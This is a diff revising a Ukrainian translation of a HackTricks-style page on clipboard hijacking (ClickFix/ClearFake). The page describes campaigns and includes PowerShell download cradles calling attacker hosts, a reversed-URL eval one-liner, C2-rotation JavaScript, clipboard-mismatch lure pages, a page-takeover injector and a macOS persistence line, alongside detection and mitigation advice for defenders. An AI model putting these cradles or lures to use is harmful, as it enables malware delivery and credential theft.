@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> «Ніколи не вставляйте те, що ви самі не копіювали.» – стара, але досі слушна порада
+> "Ніколи не вставляйте нічого, чого ви самі не копіювали." – стара, але досі дійсна порада
 
 ## Огляд
 
-Clipboard hijacking – також відоме як *pastejacking* – зловживає тим, що користувачі рутинно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (або будь-який контекст із підтримкою JavaScript, такий як Electron або Desktop application) програмно поміщає контрольований нападачем текст у системний буфер обміну. Жертви зазвичай заохочуються, через ретельно підготовлені інструкції соціальної інженерії, натиснути **Win + R** (діалог "Виконати"), **Win + X** (Швидкий доступ / PowerShell), або відкрити термінал і *вставити* вміст буфера обміну, миттєво виконуючи довільні команди.
+Clipboard hijacking – також відомий як *pastejacking* – зловживає тим, що користувачі рутинно копіюють і вставляють команди без їх перевірки. Зловмисна веб-сторінка (або будь-який контекст із підтримкою JavaScript, наприклад Electron або Desktop application) програмно поміщає текст, контрольований нападником, у system clipboard. Жертви заохочуються, зазвичай ретельно підготовленими інструкціями соціальної інженерії, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *paste* вміст clipboard, при цьому негайно виконуючи довільні команди.
 
-Оскільки **жоден файл не завантажується і жодне вкладення не відкривається**, техніка обходить більшість контролів безпеки електронної пошти та веб-контенту, що моніторять вкладення, макроси або пряме виконання команд. Через це атака є популярною в фішингових кампаніях, які доставляють поширені сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.
+Оскільки **файл не завантажується і вкладення не відкривається**, техніка обходить більшість засобів безпеки електронної пошти та веб-контенту, які моніторять вкладення, макроси або пряме виконання команд. Тому атака популярна в phishing кампаніях, що доставляють комерційні сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.
 
-## Forced copy buttons and hidden payloads (macOS one-liners)
+## Примусові кнопки копіювання та приховані payloads (macOS one-liners)
 
-Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у буфері обміну містить очікувану команду інсталятора плюс доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тож одна вставка виконує обидва етапи, у той час як UI ховає додаткову стадію.
+Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у clipboard містить очікувану команду інсталятора плюс доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому один *paste* виконує обидва етапи, поки UI приховує додаткову стадію.
 
 ## JavaScript Proof-of-Concept
 ```html
@@ -26,17 +26,17 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).
+Старі кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).
 
-## Потік ClickFix / ClearFake
+## The ClickFix / ClearFake Flow
 
-1. Користувач відвідує typosquatted або скомпрометований сайт (e.g. `docusign.sa[.]com`)
-2. Інжектований **ClearFake** JavaScript викликає хелпер `unsecuredCopyToClipboard()`, який приховано зберігає Base64-encoded PowerShell one-liner у буфері обміну.
-3. HTML-інструкція каже жертві: *“Натисніть **Win + R**, вставте команду та натисніть Enter, щоб вирішити проблему.”*
-4. `powershell.exe` виконується, завантажуючи архів, який містить легітимний виконуваний файл та шкідливий DLL (classic DLL sideloading).
-5. Завантажувач дешифрує додаткові стадії, інжектить shellcode і встановлює persistence (e.g. scheduled task) – в результаті запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.
+1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад `docusign.sa[.]com`)
+2. Інжектований JavaScript **ClearFake** викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка безшумно зберігає Base64-encoded PowerShell one-liner у буфері обміну.
+3. HTML-інструкції кажуть жертві: *«Натисніть **Win + R**, вставте команду і натисніть Enter, щоб вирішити проблему.»*
+4. `powershell.exe` запускається, завантажуючи архів, який містить легітимний виконуваний файл та шкідливу DLL (classic DLL sideloading).
+5. Лоадер розшифровує додаткові стадії, інжектує shellcode та встановлює persistence (наприклад scheduled task) — зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.
 
-### Приклад ланцюжка NetSupport RAT
+### Приклад ланцюга NetSupport RAT
 ```powershell
 powershell -nop -w hidden -enc <Base64>
 # ↓ Decodes to:
@@ -44,35 +44,35 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (легітимний Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
-* Зловмисна DLL динамічно отримує адреси API через **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх, використовуючи rolling XOR key `"https://google.com/"`, впроваджує фінальний shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.
+* `jp2launcher.exe` (legitimate Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
+* Зловмисний DLL динамічно визначає адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, дешифрує їх, використовуючи rolling XOR key `"https://google.com/"`, впроваджує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) до `C:\ProgramData\SecurityCheck_v1\`.
 
 ### Latrodectus Loader
 ```
 powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. Завантажує `la.txt` за допомогою **curl.exe**
-2. Виконує JScript downloader в **cscript.exe**
-3. Завантажує MSI payload → скидає `libcef.dll` поряд із підписаним додатком → DLL sideloading → shellcode → Latrodectus.
+2. Виконує JScript downloader у **cscript.exe**
+3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаною програмою → DLL sideloading → shellcode → Latrodectus.
 
 ### Lumma Stealer через MSHTA
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-Виклик **mshta** запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` та об'єднання файлів і врешті запускає `.a3x`-скрипт, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.
+The **mshta** call запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відтворює `AutoIt3.exe` за допомогою `extrac32` та конкатенації файлів і нарешті запускає `.a3x` скрипт, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.
 
-## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)
+## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK з ротацією C2 (PureHVNC)
 
-Деякі кампанії ClickFix повністю пропускають завантаження файлів і просять жертв вставити one‑liner, який завантажує та виконує JavaScript через WSH, забезпечує персистентність і щоденно змінює C2. Приклад спостереженого ланцюжка:
+Деякі кампанії ClickFix повністю оминають завантаження файлів і наказують жертвам вставити однорядкову команду, яка отримує та виконує JavaScript через WSH, забезпечує персистентність і щоденно змінює C2. Приклад спостереженого ланцюга:
 ```powershell
 powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
 ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
 ```
-Ключові риси
+Ключові ознаки
 - Обфускований URL перевертається під час виконання, щоб ускладнити поверхневу перевірку.
-- JavaScript забезпечує персистентність через Startup LNK (WScript/CScript) і обирає C2 за поточним днем – що дозволяє швидку domain rotation.
+- JavaScript зберігає себе через Startup LNK (WScript/CScript) і обирає C2 за поточним днем — що дозволяє швидку ротацію доменів.
 
-Мінімальний JS-фрагмент, що використовується для rotate C2s за датою:
+Мінімальний фрагмент JS, що використовується для ротації C2s за датою:
 ```js
 function getURL() {
 var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
@@ -84,35 +84,36 @@ return 'https://'
 + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
 }
 ```
-Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто прив'язуючи TLS до жорстко вбудованого сертифіката та розбиваючи трафік на частини.
+Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто pinning TLS до жорстко закодованого certificate і chunking трафіку.
 
 Detection ideas specific to this variant
-- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
-- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
-- Registry/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
-- Повторювані `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads, щоб подавати довгі скрипти без довгих командних рядків.
-- Scheduled Tasks, які потім виконують LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як оновлювач (наприклад, `\GoogleSystem\GoogleUpdater`).
+- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
+- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, що викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
+- Реєстр/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
+- Повторювані `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads для передачі довгих скриптів без довгих командних рядків.
+- Заплановані завдання, які згодом виконують LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як оновлювач (наприклад, `\GoogleSystem\GoogleUpdater`).
 
 Threat hunting
-- Щоденно-обертаючіся C2 hostnames і URL з шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
-- Корелюйте події запису clipboard, за якими йде вставка через Win+R і негайне виконання `powershell.exe`.
+- Щоденно-обертаючіся C2 hostnames і URLs з шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
+- Корелюйте події запису в clipboard, за якими слідує вставка Win+R і негайне виконання `powershell.exe`.
+
 
 Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:
 
-* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – шукайте незвичні Base64 / обфусковані записи.
-* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe` і `NewProcessName` в { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
-* Event ID **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілим 4688 подією.
-* EDR clipboard sensors (if present) – корелюйте `Clipboard Write`, за яким відразу запускається новий PowerShell процес.
+* Реєстр Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – шукати незвичні Base64 / обфусковані записи.
+* Security Event ID **4688** (Process Creation), коли `ParentImage` == `explorer.exe` і `NewProcessName` належить { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
+* Event ID **4663** для створень файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілою подією 4688.
+* EDR clipboard sensors (якщо присутні) – корелюйте `Clipboard Write`, за яким одразу слідує новий процес PowerShell.
 
 ## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads
 
-Останні кампанії масово створюють фейкові CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-specific команди з їхнього clipboard у нативні консолі. Це виводить виконання за межі браузерного sandbox і працює як на Windows, так і на macOS.
+Нещодавні кампанії масово створюють підробні CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-специфічні команди з їхнього clipboard у нативні консолі. Це дозволяє виконання поза браузерним sandbox і працює як у Windows, так і в macOS.
 
-Ключові ознаки сторінок, згенерованих цим builder
-- Визначення OS через `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні decoys/no-ops для непідтримуваних ОС, щоб зберегти ілюзію.
-- Автоматичне clipboard-copy при benign UI діях (checkbox/Copy), тоді як видимий текст може відрізнятися від вмісту clipboard.
-- Блокування мобільних пристроїв і popover зі покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
-- Опціональна обфускація і single-file injector для перезапису DOM компрометованого сайту Tailwind‑стильованим verification UI (нову реєстрацію домену не вимагає).
+Key traits of the builder-generated pages
+- Визначення OS через `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні приманки/no-ops для непідтримуваних ОС, щоб зберегти ілюзію.
+- Автоматичне копіювання в clipboard при благовидних UI-діях (checkbox/Copy), тоді як видимий текст може відрізнятися від вмісту clipboard.
+- Блокування мобільних пристроїв та поповер із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
+- Опціональна обфускація та single-file injector для перезапису DOM скомпрометованого сайту Tailwind-styled verification UI (не вимагається реєстрація нового домену).
 
 Example: clipboard mismatch + OS-aware branching
 ```html
@@ -141,10 +142,10 @@ document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal 
 document.getElementById('chk').addEventListener('click', copyReal);
 </script>
 ```
-Персистентність macOS після початкового запуску
-- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.
+macOS persistence під час початкового запуску
+- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.
 
-Безпосереднє захоплення сторінки на скомпрометованих сайтах
+In-place page takeover on compromised sites
 ```html
 <script>
 (async () => {
@@ -157,10 +158,10 @@ document.head.appendChild(s);
 </script>
 ```
 Detection & hunting ideas specific to IUAM-style lures
-- Web: Сторінки, які прив'язують Clipboard API до віджетів верифікації; невідповідність між відображеним текстом та payload буфера обміну; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
-- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI інсталятори, виконані з `%TEMP%`.
-- macOS endpoint: Terminal/iTerm, що породжує `bash`/`curl`/`base64 -d` з `nohup` поруч із подіями браузера; фонові задачі, які переживають закриття терміналу.
-- Корелюйте `RunMRU` Win+R історію та записів буфера обміну з наступним створенням консольних процесів.
+- Web: Сторінки, що прив’язують Clipboard API до віджетів верифікації; невідповідність між відображуваним текстом та clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
+- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI installers, виконані з `%TEMP%`.
+- macOS endpoint: Terminal/iTerm, що породжують `bash`/`curl`/`base64 -d` з `nohup` поблизу подій браузера; фоні job-и, які виживають після закриття терміналу.
+- Корелюйте `RunMRU`/Win+R історію та clipboard writes з подальшим створенням консольних процесів.
 
 See also for supporting techniques
 
@@ -174,41 +175,41 @@ homograph-attacks.md
 
 ## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)
 
-- ClearFake продовжує компрометацію WordPress сайтів і ін’єкцію loader JavaScript, який ланцюжить зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть блокчейн “etherhiding” виклики (e.g., POSTs до Binance Smart Chain API endpoints таких як `bsc-testnet.drpc[.]org`) щоб витягти поточну логіку приманки. Останні оверлеї широко використовують fake CAPTCHAs, які інструктують користувачів copy/paste one-liner (T1204.004) замість завантаження чогось.
-- Початкове виконання все частіше делегується підписаним script hosts/LOLBAS. Ланцюги січня 2026 замінили раннє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, який виконується через `WScript.exe`, передаючи PowerShell-like аргументи з aliases/wildcards для отримання remote content:
+- ClearFake продовжує компрометувати WordPress сайти та інжектити loader JavaScript, який ланцюжить зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть blockchain “etherhiding” виклики (наприклад, POSTs до Binance Smart Chain API endpoints таких як `bsc-testnet.drpc[.]org`) для підвантаження поточної логіки приманки. Останні оверлеї широко використовують фейкові CAPTCHA, які просять користувачів скопіювати/вставити one-liner (T1204.004) замість завантаження чогось.
+- Початкове виконання все більше делегується signed script hosts/LOLBAS. Ланцюжки січня 2026 замінили раннє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, що запускається через `WScript.exe`, передаючи PowerShell-like аргументи з aliases/wildcards для отримання віддаленого контенту:
 ```cmd
 "C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
 ```
-- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у парі з `WScript.exe` та незвичними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає високосигнальною стадією LOLBAS для ClearFake.
-- У лютому 2026 fake CAPTCHA payloads повернулися до чистих PowerShell download cradles. Два живі приклади:
+- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у парі з `WScript.exe` та незвичайними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає надійним індикатором (high-signal) у ланцюжку LOLBAS для ClearFake.
+- У лютому 2026 року підроблені CAPTCHA payloads повернулися до чистих PowerShell download cradles. Два реальних приклади:
 ```powershell
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
 ```
-- Перший chain is an in-memory `iex(irm ...)` grabber; другий стейджиться via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.
+- Перший ланцюг — in-memory `iex(irm ...)` grabber; другий виконує стадії через `WinHttp.WinHttpRequest.5.1`, записує тимчасовий `.ps1`, а потім запускає з `-ep bypass` у прихованому вікні.
 
-Detection/hunting tips for these variants
-- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
-- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
-- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
-- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.
+Поради з виявлення/полювання для цих варіантів
+- Process lineage: браузер → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після записів у буфер обміну/натискання Win+R.
+- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, або raw IP `iex(irm ...)` patterns.
+- Network: вихідні з’єднання до CDN worker hosts або blockchain RPC endpoints від script hosts/PowerShell незабаром після веб-перегляду.
+- File/registry: тимчасове створення `.ps1` під `%TEMP%` плюс RunMRU записи, що містять ці one-liners; блокувати/генерувати alert на signed-script LOLBAS (WScript/cscript/mshta), що виконується з external URLs або обфускованими alias-рядками.
 
-## Mitigations
+## Пом'якшення
 
-1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
-2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
-3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
-4. Network controls – block outbound requests to known pastejacking and malware C2 domains.
+1. Програми/браузери — жорстке налаштування браузера: відключити доступ до запису в буфер обміну (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати user gesture.
+2. Security awareness — навчити користувачів *вводити* чутливі команди вручну або спочатку вставляти їх у текстовий редактор.
+3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liners.
+4. Network controls — блокувати вихідні запити до відомих pastejacking та malware C2 доменів.
 
-## Related Tricks
+## Пов'язані трюки
 
-* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:
+* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів у шкідливий сервер:
 
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
 
-## References
+## Джерела
 
 - [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
 - [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
